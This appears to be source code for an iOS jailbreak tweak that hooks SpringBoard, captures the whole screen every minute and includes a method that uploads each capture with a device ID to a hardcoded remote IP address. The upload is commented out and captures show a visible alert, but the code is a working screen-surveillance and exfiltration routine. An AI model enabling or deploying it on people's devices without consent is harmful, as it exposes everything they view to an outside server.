#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <SpringBoard/SpringBoard.h>
#import <AudioToolbox/AudioToolbox.h>
#import "CARenderServer.h"
#import <CoreGraphics/CoreGraphics.h>

// Configuration - Change these values
static NSString *API_ENDPOINT = @"https://186.190.215.38:3000/screenshots/device/";
static NSInteger SCREENSHOT_INTERVAL = 60; // 1 minute in seconds
static NSString *DEVICE_ID = nil; // Will be set to device UDID

// Declare the new methods in SpringBoard interface
@interface SpringBoard (ScreenshotMonitor)
- (void)captureAndUploadScreenshot;
- (UIImage *)takeScreenshot;
- (void)uploadScreenshot:(UIImage *)screenshot;
@end

%hook SpringBoard

-(void)applicationDidFinishLaunching:(id)application {
    %orig;
    
    // Get device ID if not set
    if (!DEVICE_ID) {
        DEVICE_ID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
    }
    
    // Schedule periodic screenshots
    [NSTimer scheduledTimerWithTimeInterval:SCREENSHOT_INTERVAL
                                     target:self
                                   selector:@selector(captureAndUploadScreenshot)
                                   userInfo:nil
                                    repeats:YES];
    
    // Take initial screenshot
    [self performSelector:@selector(captureAndUploadScreenshot) withObject:nil afterDelay:10.0];
    
    NSLog(@"[ScreenshotMonitor] Initialized with endpoint: %@", API_ENDPOINT);
}

%new
-(void)captureAndUploadScreenshot {
    dispatch_async(dispatch_get_main_queue(), ^{
        @autoreleasepool {
            UIImage *screenshot = [self takeScreenshot];
            if (screenshot) {
                AudioServicesPlaySystemSound(kSystemSoundID_Vibrate);
                NSLog(@"[ScreenshotMonitor] Screenshot captured successfully!");

                // Show a visual alert
                UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"ScreenshotMonitor"
                                                                               message:@"Screenshot captured!"
                                                                        preferredStyle:UIAlertControllerStyleAlert];
                // Dismiss after 1 second
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    [alert dismissViewControllerAnimated:YES completion:nil];
                });
                // Present the alert
                UIWindow *keyWindow = [UIApplication sharedApplication].keyWindow;
                [keyWindow.rootViewController presentViewController:alert animated:YES completion:nil];

                // Optionally upload in background
                // dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
                //     [self uploadScreenshot:screenshot];
                // });
            } else {
                NSLog(@"[ScreenshotMonitor] Failed to capture screenshot");
                AudioServicesPlaySystemSound(1007);
            }
        }
    });
}

%new
-(UIImage *)takeScreenshot {
    @try {
        UIScreen *mainScreen = [UIScreen mainScreen];
        CGFloat scale = mainScreen.scale;
        CGRect bounds = mainScreen.bounds;

        CGSize size = bounds.size;
        size.width *= scale;
        size.height *= scale;

        CGBitmapInfo bitmapInfo = kCGImageAlphaNoneSkipFirst | kCGBitmapByteOrder32Little;
        CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();

        CGContextRef context = CGBitmapContextCreate(NULL, size.width, size.height, 8, 0, colorSpace, bitmapInfo);
        CGColorSpaceRelease(colorSpace);

        if (!context) {
            NSLog(@"[ScreenshotMonitor] Failed to create bitmap context");
            return nil;
        }

        // Render the display
        CARenderServerRenderDisplay(0, CFSTR("LCD"), context, bounds, 0);

        CGImageRef imageRef = CGBitmapContextCreateImage(context);
        UIImage *screenshot = [UIImage imageWithCGImage:imageRef scale:scale orientation:UIImageOrientationUp];

        CGImageRelease(imageRef);
        CGContextRelease(context);

        return screenshot;
    } @catch (NSException *exception) {
        NSLog(@"[ScreenshotMonitor] Exception taking screenshot: %@", exception);
        return nil;
    }
}

%new
-(void)uploadScreenshot:(UIImage *)screenshot {
    // Convert image to JPEG data
    NSData *imageData = UIImageJPEGRepresentation(screenshot, 0.8);
    if (!imageData) {
        NSLog(@"[ScreenshotMonitor] Failed to convert screenshot to JPEG");
        return;
    }

    // Build the URL with device ID in the path
    NSString *urlString = [NSString stringWithFormat:@"%@%@", API_ENDPOINT, DEVICE_ID];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
    [request setHTTPMethod:@"POST"];

    // Create multipart form data
    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
    NSString *contentType = [NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary];
    [request setValue:contentType forHTTPHeaderField:@"Content-Type"];

    // Create body
    NSMutableData *body = [NSMutableData data];

    // Add timestamp field (as Unix time string)
    NSString *timestamp = [NSString stringWithFormat:@"%ld", (long)[[NSDate date] timeIntervalSince1970]];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"timestamp\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[timestamp dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

    // Add image data
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"screenshot\"; filename=\"screenshot.jpg\"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: image/jpeg\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:imageData];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

    // End multipart form
    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    [request setHTTPBody:body];

    // Create task
    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request
                                            completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[ScreenshotMonitor] Upload error: %@", error);
            return;
        }

        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        if (httpResponse.statusCode >= 200 && httpResponse.statusCode < 300) {
            NSLog(@"[ScreenshotMonitor] Screenshot uploaded successfully");
        } else {
            NSLog(@"[ScreenshotMonitor] Upload failed with status code: %ld", (long)httpResponse.statusCode);
            if (data) {
                NSString *responseStr = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                NSLog(@"[ScreenshotMonitor] Response: %@", responseStr);
            }
        }
    }];

    [task resume];
}

%end

// Required constructor
%ctor {
    NSLog(@"[ScreenshotMonitor] Tweak loaded");
} 